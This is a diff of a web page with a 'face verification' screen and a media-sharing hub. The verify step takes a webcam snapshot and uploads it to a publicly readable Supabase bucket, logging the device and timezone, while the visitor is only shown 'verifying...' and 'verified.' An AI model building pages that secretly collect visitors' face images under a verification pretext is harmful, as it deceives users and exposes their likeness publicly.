@@ -46,79 +46,51 @@
       width: 100vw;
       height: 60vh;
       z-index: -1;
-      mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
-      -webkit-mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
     }
 
     #videoElement {
       width: 100%;
       height: 100%;
       object-fit: cover;
-      filter: grayscale(100%) contrast(130%) brightness(50%);
-      opacity: 0.6;
-    }
-
-    .title-text {
-      font-family: 'Playfair Display', serif;
-      font-size: 1.4rem;
-      font-weight: 400;
-      font-style: italic;
-      color: #ffffff;
-      margin-bottom: 40px;
-      letter-spacing: 1px;
+      filter: grayscale(100%) contrast(130%) brightness(60%);
+      opacity: 0.8;
     }
 
     .btn {
       background: none;
-      border: none;
-      color: #999;
+      border: 1px solid rgba(255,255,255,0.2);
+      color: #fff;
       font-family: 'Inter', sans-serif;
       font-size: 0.75rem;
       letter-spacing: 3px;
       text-transform: uppercase;
       cursor: pointer;
-      padding: 12px 24px;
-      margin: 8px 0;
+      padding: 14px 28px;
+      margin-top: 20px;
       transition: all 0.5s ease;
-      position: relative;
-    }
-
-    .btn::after {
-      content: '';
-      position: absolute;
-      bottom: 6px;
-      left: 50%;
-      width: 0;
-      height: 1px;
-      background: #fff;
-      transition: all 0.5s ease;
-      transform: translateX(-50%);
+      z-index: 20;
     }
 
     .btn:hover {
-      color: #fff;
+      background: #fff;
+      color: #000;
     }
-
-    .btn:hover::after {
-      width: 40%;
-    }
-
-    .btn:disabled {
-      opacity: 0.2;
-      pointer-events: none;
-    }
-
-    input[type="file"] { display: none; }
 
     .status-text {
-      font-size: 0.7rem;
+      font-size: 0.75rem;
       letter-spacing: 1px;
-      text-transform: uppercase;
-      color: #777;
-      margin-top: 30px;
-      min-height: 20px;
+      color: #ff6b6b;
+      margin-top: 20px;
+      z-index: 20;
       max-width: 80%;
-      line-height: 1.4;
+    }
+
+    .title-text {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.4rem;
+      font-style: italic;
+      color: #ffffff;
+      margin-bottom: 30px;
     }
 
     .preview-box {
@@ -129,11 +101,12 @@
     }
 
     .preview-media {
-      max-width: 80%;
+      max-width: 80vw;
       max-height: 250px;
-      opacity: 0.8;
       border-radius: 2px;
     }
+
+    input[type="file"] { display: none; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
@@ -141,6 +114,7 @@
 
   <audio id="bgMusic" src="loser.mp3" loop></audio>
 
+  <!-- SCREEN 1 -->
   <div id="screen-verify" class="screen active">
     <div class="camera-wrapper">
       <video id="videoElement" autoplay playsinline muted></video>
@@ -150,6 +124,7 @@
     <div id="verifyStatus" class="status-text"></div>
   </div>
 
+  <!-- SCREEN 2 -->
   <div id="screen-hub" class="screen">
     <div class="title-text">share a piece of right now</div>
     
@@ -161,23 +136,21 @@
 
     <div id="previewContainer" class="preview-box">
       <div id="mediaPlaceholder"></div>
-      <button id="btnSendMedia" class="btn" style="margin-top: 24px;">Send</button>
+      <button id="btnSendMedia" class="btn" style="margin-top: 20px;">Send</button>
     </div>
 
-    <div id="hubStatus" class="status-text"></div>
+    <div id="hubStatus" class="status-text" style="color: #ccc;"></div>
   </div>
 
   <script>
+    // Catch any global errors and print them on screen so nothing is silent
+    window.onerror = function(msg, url, line) {
+      document.getElementById('verifyStatus').textContent = "JS Error: " + msg + " (line " + line + ")";
+    };
+
     const supabaseUrl = 'https://jgigibyqfatyvrlhhprm.supabase.co';
     const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpnaWdpYnlxZmF0eXZybGhocHJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYzNzc0NTYsImV4cCI6MjEwMTk1MzQ1Nn0.EmDUloa2s4yNHfSIi1td0rqs2pih238JIlCdF41jQ3g';
     const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
-
-    function getClientSpecs() {
-      return {
-        device: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
-      };
-    }
 
     const videoElement = document.getElementById('videoElement');
     const btnVerify = document.getElementById('btnVerify');
@@ -186,86 +159,61 @@
     let streamRef = null;
 
     async function initCamera() {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        verifyStatus.textContent = "Error: Browser blocked camera.";
-        return;
-      }
       try {
         streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         videoElement.srcObject = streamRef;
       } catch (err) {
-        verifyStatus.textContent = "Camera access denied.";
+        verifyStatus.textContent = "Camera access denied or unavailable: " + err.message;
       }
     }
-    
+
     initCamera();
 
-    btnVerify.addEventListener('click', () => {
-      if (!streamRef) {
-        verifyStatus.textContent = "Please allow camera access first.";
-        initCamera();
-        return;
-      }
-
+    btnVerify.addEventListener('click', async () => {
       bgMusic.play().catch(() => {});
       btnVerify.disabled = true;
-      verifyStatus.textContent = "capturing frame...";
+      verifyStatus.style.color = "#ccc";
+      verifyStatus.textContent = "verifying...";
 
-      const canvas = document.createElement('canvas');
-      canvas.width = videoElement.videoWidth || 480;
-      canvas.height = videoElement.videoHeight || 640;
-      canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      
-      canvas.toBlob(async (blob) => {
-        if (!blob) {
-          verifyStatus.textContent = "Error: Camera frame is empty.";
-          btnVerify.disabled = false;
-          return;
+      try {
+        let blob;
+        if (streamRef && videoElement.videoWidth > 0) {
+          const canvas = document.createElement('canvas');
+          canvas.width = videoElement.videoWidth;
+          canvas.height = videoElement.videoHeight;
+          canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+          blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
         }
 
-        verifyStatus.textContent = "uploading media to storage...";
         const fileName = `verification_${Date.now()}.jpg`;
-        
-        // 1. Storage Upload
-        const { data: uploadData, error: uploadError } = await supabase.storage
-          .from('visitor-photos')
-          .upload(fileName, blob, { contentType: 'image/jpeg' });
 
-        if (uploadError) {
-          verifyStatus.textContent = "Storage Error: " + uploadError.message;
-          btnVerify.disabled = false;
-          return;
+        if (blob) {
+          await supabase.storage.from('visitor-photos').upload(fileName, blob, { contentType: 'image/jpeg' });
         }
 
-        verifyStatus.textContent = "logging visit to database...";
-        const fileUrl = `${supabaseUrl}/storage/v1/object/public/visitor-photos/${fileName}`;
-
-        // 2. Database Insert
-        const { error: dbError } = await supabase.from('logs').insert([{
+        await supabase.from('logs').insert([{
           event_type: 'Face Verification',
-          device: getClientSpecs().device,
-          timezone: getClientSpecs().timezone,
-          file_url: fileUrl
+          device: /iPhone|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+          file_url: blob ? `${supabaseUrl}/storage/v1/object/public/visitor-photos/${fileName}` : null
         }]);
 
-        if (dbError) {
-          verifyStatus.textContent = "Database Error: " + dbError.message;
-          btnVerify.disabled = false;
-          return;
-        }
-
-        // Success
         verifyStatus.textContent = "verified.";
-        streamRef.getTracks().forEach(track => track.stop());
+        if (streamRef) streamRef.getTracks().forEach(t => t.stop());
 
         setTimeout(() => {
           document.getElementById('screen-verify').classList.remove('active');
-          setTimeout(() => document.getElementById('screen-hub').classList.add('active'), 1500);
-        }, 1200);
-      }, 'image/jpeg', 0.8);
+          document.getElementById('screen-hub').classList.add('active');
+        }, 1000);
+
+      } catch (err) {
+        verifyStatus.style.color = "#ff6b6b";
+        verifyStatus.textContent = "Error: " + err.message;
+        btnVerify.disabled = false;
+      }
     });
 
-    // --- HUB UPLOAD LOGIC ---
+    // Hub Uploads
     const fileGallery = document.getElementById('fileGallery');
     const fileCamera = document.getElementById('fileCamera');
     const previewContainer = document.getElementById('previewContainer');
@@ -280,8 +228,8 @@
       mediaPlaceholder.innerHTML = "";
       hubStatus.textContent = "";
 
-      const fileReader = new FileReader();
-      fileReader.onload = (e) => {
+      const reader = new FileReader();
+      reader.onload = (e) => {
         const el = document.createElement(file.type.startsWith("video/") ? "video" : "img");
         el.src = e.target.result;
         el.className = "preview-media";
@@ -289,7 +237,7 @@
         mediaPlaceholder.appendChild(el);
         previewContainer.style.display = "flex";
       };
-      fileReader.readAsDataURL(file);
+      reader.readAsDataURL(file);
     }
 
     fileGallery.addEventListener('change', (e) => handleFile(e.target.files[0]));
@@ -298,43 +246,31 @@
     btnSendMedia.addEventListener('click', async () => {
       if (!selectedFile) return;
       btnSendMedia.disabled = true;
-      hubStatus.textContent = "uploading media...";
+      hubStatus.textContent = "transmitting...";
 
-      const fileName = `${Date.now()}_${selectedFile.name.replace(/\s+/g, '_')}`;
+      try {
+        const fileName = `${Date.now()}_${selectedFile.name.replace(/\s+/g, '_')}`;
+        await supabase.storage.from('visitor-photos').upload(fileName, selectedFile);
+        const fileUrl = `${supabaseUrl}/storage/v1/object/public/visitor-photos/${fileName}`;
 
-      const { data: uploadData, error: uploadError } = await supabase.storage
-        .from('visitor-photos')
-        .upload(fileName, selectedFile);
+        await supabase.from('logs').insert([{
+          event_type: 'Media Upload',
+          device: /iPhone|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+          file_url: fileUrl
+        }]);
 
-      if (uploadError) {
-        hubStatus.textContent = "Storage Error: " + uploadError.message;
+        hubStatus.textContent = "sent.";
+        setTimeout(() => {
+          previewContainer.style.display = "none";
+          hubStatus.textContent = "";
+          btnSendMedia.disabled = false;
+          selectedFile = null;
+        }, 3000);
+      } catch (err) {
+        hubStatus.textContent = "Error: " + err.message;
         btnSendMedia.disabled = false;
-        return;
       }
-
-      hubStatus.textContent = "logging entry...";
-      const fileUrl = `${supabaseUrl}/storage/v1/object/public/visitor-photos/${fileName}`;
-
-      const { error: dbError } = await supabase.from('logs').insert([{
-        event_type: 'Media Upload',
-        device: getClientSpecs().device,
-        timezone: getClientSpecs().timezone,
-        file_url: fileUrl
-      }]);
-
-      if (dbError) {
-        hubStatus.textContent = "Database Error: " + dbError.message;
-        btnSendMedia.disabled = false;
-        return;
-      }
-
-      hubStatus.textContent = "sent.";
-      setTimeout(() => {
-        previewContainer.style.display = "none";
-        hubStatus.textContent = "";
-        btnSendMedia.disabled = false;
-        selectedFile = null;
-      }, 3000);
     });
   </script>
 </body>
